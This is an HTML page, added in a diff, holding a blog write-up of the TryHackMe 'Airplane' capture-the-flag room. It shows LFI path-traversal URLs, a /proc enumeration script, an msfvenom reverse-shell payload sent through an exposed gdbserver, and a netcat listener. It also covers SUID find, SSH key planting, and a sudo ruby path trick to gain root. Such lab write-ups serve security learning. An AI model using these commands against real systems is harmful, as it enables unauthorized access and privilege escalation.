@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Airplane - ~/xv1&#39;s projects</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="../../../css/fonts.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" media="screen" href="../../../css/main.css" />
+    </head>
+    <body>
+        <div class="content">
+            <header>
+                <div class="main">
+                    <a href="../../../index.html">~/xv1&#39;s projects</a>
+                </div>
+                <nav>
+                    
+                    <a href="../../../writeups/index.html">./writeups</a>
+                    
+                </nav>
+            </header>
+            <main>
+                <article>
+                    <div class="title">
+                        <h1 class="title">Airplane</h1>
+                        <div class="meta">Posted on Jun 10, 2024</div>
+                    </div>
+                    <div class="post-tags">
+                        <nav class="nav tags">
+                            <ul class="tags">
+                                <li><a href="/tagsthm">thm</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <section class="body">
+                        <p><a href="http://tryhackme.com/r/room/airplane">ctf link</a></p>
+                        <blockquote>
+                            <p>Are you ready to fly?</p>
+                        </blockquote>
+                        <h4 id="steps">Steps</h4>
+                        <ol>
+                            <li>Started out with an nmap scan <code>nmap -sV 10.10.101.33 -v</code></li>
+                            <li>Got the ports <code>22</code> and <code>8000</code>, ssh and http</li>
+                            <li>Navigating to <code>10.10.101.33:8000</code>, I got redirected to <code>airplane.thm</code></li>
+                            <li>I added this to my host file for DNS resolution with:</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo sh -c <span style="color:#e6db74">&#34;echo &#39;10.10.101.33 airplane.thm&#39; &gt;&gt; /etc/hosts&#34;</span>
+</span></span></code></pre>
+                        </div>
+                        <ol start="5">
+                            <li>Navigating to the page, I found the page file specified with a page parameter -&gt; <code>http://airplane.thm:8000/?page=index.html</code></li>
+                            <li>After checking source to make sure I didn&rsquo;t miss anything else, I modified the file path to grab <code>/etc/passwd</code></li>
+                        </ol>
+                        <pre tabindex="0"><code>http://airplane.thm:8000/?page=/../../../../etc/passwd
+</code></pre>
+                        <ol start="7">
+                            <li>Easy LFI with no filters &lt;333</li>
+                            <li>From the file I found two users:</li>
+                        </ol>
+                        <pre tabindex="0"><code>carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
+hudson:x:1001:1001::/home/hudson:/bin/bash
+</code></pre>
+                        <ol start="9">
+                            <li>I tried to use the same path traversal to read potential <code>user.txt</code> files in the home folders, but all I could find was a <code>.bashrc</code> file under hudsons directory (also I checked for ssh keys (<code>/.ssh/id_rsa</code>), there were none)</li>
+                            <li>One interesting thing is the <code>carlos,,,</code> section of carlos&rsquo;s line the in the /etc/passwd file</li>
+                            <li>This is the <code>GECOS</code> section, and the following commas just mean that phone number, email, etc parameters are empty</li>
+                            <li>So relatively useless &lt;/3 (but hey new info to me)</li>
+                            <li>I tried running <code>hydra</code> to bruteforce <code>ssh</code> with the new usernames, but I didn&rsquo;t have much luck</li>
+                            <li>Going back to the site itself, I decided to run a scan on all ports <code>-p- -T5</code> to see if there were any other processes I missed</li>
+                            <li>From this I found port <code>6048</code></li>
+                        </ol>
+                        <pre tabindex="0"><code>PORT     STATE SERVICE VERSION
+6048/tcp open  x11?
+</code></pre>
+                        <ol start="16">
+                            <li>Ok strange</li>
+                            <li>My only guess was trying to find out what processes were running by checking files manually</li>
+                            <li>All of this info is in the <code>/proc</code> directory</li>
+                            <li>Most <code>/proc</code> subdirectories are PIDs (numbers) so automating requests shouldn&rsquo;t be too difficult</li>
+                            <li>So I wrote a VERY barebones python script</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> pid <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1001</span>):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://airplane.thm:8000/?page=/../../../../proc/</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/cmdline&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        print(pid, res<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error fetching PID </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre>
+                        </div>
+                        <ol start="21">
+                            <li>Took about 5000000 years to run but it worked!</li>
+                            <li>Interesting results:</li>
+                        </ol>
+                        <pre tabindex="0"><code>374 avahi-daemon: running [airplane.local]
+529 /usr/bin/gdbserver0.0.0.0:6048airplane
+</code></pre>
+                        <ol start="23">
+                            <li>Looking into <code>gdbserver</code></li>
+                        </ol>
+                        <pre tabindex="0"><code>└─$ searchsploit gdbserver
+
+------------------------------------------------- ---------------------------------
+ Exploit Title                                   |  Path
+------------------------------------------------- ---------------------------------
+GNU gdbserver 9.2 - Remote Command Execution (RC | linux/remote/50539.py
+------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+                        <ol start="24">
+                            <li>I used metasploit to exploit gdbserver (reference: <a href="http://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver">http://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver</a>)</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.2.13.251 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">7777</span> PrependFork<span style="color:#f92672">=</span>true -f elf -o exploit.elf
+</span></span></code></pre>
+                        </div>
+                        <ol start="25">
+                            <li>Make it executable with <code>chmod +x</code> and run it with <code>gdb exploit.elf</code></li>
+                            <li>Then on gdb I ran <code>target extended-remote 10.10.101.33:6048</code></li>
+                            <li>Set up a netcat listener on port <code>7777</code> (or wtv you choose) then transfer over the shell</li>
+                        </ol>
+                        <pre tabindex="0"><code>(gdb) remote put exploit.elf /tmp/exploit.elf
+(gdb) set remote exec-file /tmp/exploit.elf
+(gdb) run
+
+└─$ nc -lvnp 7777
+listening on [any] 7777 ...
+connect to [10.2.13.251] from (UNKNOWN) [10.10.166.15] 39078
+whoami
+hudson
+</code></pre>
+                        <ol start="28">
+                            <li>Stabilize the shell <code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+                            <li>There nothing in hudsons dir so we have to move to carlos</li>
+                            <li>No sudo -l (because no password) so I checked binary perms first</li>
+                            <li><code>/usr/bin/find</code> showed up which is exploitable (<a href="http://gtfobins.github.io/gtfobins/find/">http://gtfobins.github.io/gtfobins/find/</a>)</li>
+                            <li><code>find . -exec /bin/sh -p \; -quit</code></li>
+                            <li>From there navigate to carlos and grab user.txt</li>
+                            <li>Next privilege escalation</li>
+                            <li>To ssh as carlos:</li>
+                        </ol>
+                        <div class="highlight">
+                            <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e"># host machine</span>
+</span></span><span style="display:flex;"><span>ssh-keygen
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># rev shell</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;your public key&#34;</span> &gt;&gt; /home/carlos/.ssh/authorized_keys
+</span></span></code></pre>
+                        </div>
+                        <ol start="36">
+                            <li><code>ssh -i</code> with your private key file</li>
+                            <li>Running <code>sudo -l</code></li>
+                        </ol>
+                        <pre tabindex="0"><code>carlos@airplane:~$ sudo -l
+Matching Defaults entries for carlos on airplane:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on airplane:
+    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+</code></pre>
+                        <ol start="38">
+                            <li>gtfobins gives this command <code>ruby -e 'exec &quot;/bin/sh&quot;'</code> but since we can only run ruby files in the root directory there has to be a workaround</li>
+                            <li>File traversal! (kinda)</li>
+                        </ol>
+                        <pre tabindex="0"><code>carlos@airplane:~$ echo &#39;exec &#34;/bin/sh&#34;&#39; &gt;&gt; /tmp/test.rb
+carlos@airplane:~$ sudo ruby /root/../tmp/test.rb
+# whoami
+root
+</code></pre>
+                        <ol start="40">
+                            <li>Done!</li>
+                        </ol>
+                    </section>
+                </article>
+            </main>
+            <footer>
+                <div class="footer-info">
+                    xv1 2024-4L 
+                    
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
